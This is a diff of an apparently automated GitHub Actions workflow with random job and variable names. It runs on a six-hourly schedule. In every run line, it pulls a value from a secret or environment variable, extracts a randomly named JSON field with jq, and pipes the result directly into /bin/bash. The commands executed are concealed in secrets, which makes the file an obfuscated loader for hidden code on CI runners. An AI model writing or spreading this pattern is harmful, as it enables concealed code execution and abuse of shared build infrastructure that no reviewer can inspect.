@@ -1,8 +1,9 @@
 name: wuqidong4645
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
+    - cron: '38 5/6 * * *'
 
 jobs:
   build:
@@ -12,18 +13,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: wuqidong4645
         env:
-          i6: ${{ secrets.i6 }}
+          tmv43: ${{ secrets.tmv43 }}
         run: |
-          echo $i6 | jq -r .woz9664 | /bin/bash
-          echo $x0930 | jq -r .fgdfc20 | /bin/bash
-          echo $qrl35166 | jq -r .w320 | /bin/bash
-          echo $yqhpc11 | jq -r .beb1964 | /bin/bash
-          echo $piu9640 | jq -r .t0 | /bin/bash
-          echo $aa8 | jq -r .fynm4 | /bin/bash
-          echo $smitn8 | jq -r .avg86481 | /bin/bash
-          echo $bte66982 | jq -r .khopl50469 | /bin/bash
-          echo $mdp34 | jq -r .prqd394 | /bin/bash
-          echo $bx5997 | jq -r .yt65 | /bin/bash
-          echo $oemcu91 | jq -r .zkdpy16890 | /bin/bash
-          echo $nsaso132 | jq -r .uzx349 | /bin/bash
+          echo $tmv43 | jq -r .ovdwi12914 | /bin/bash
+          echo $w2353 | jq -r .esmo7 | /bin/bash
+          echo $w5180 | jq -r .buooj4759 | /bin/bash
+          echo $w3156 | jq -r .vlx09 | /bin/bash
 
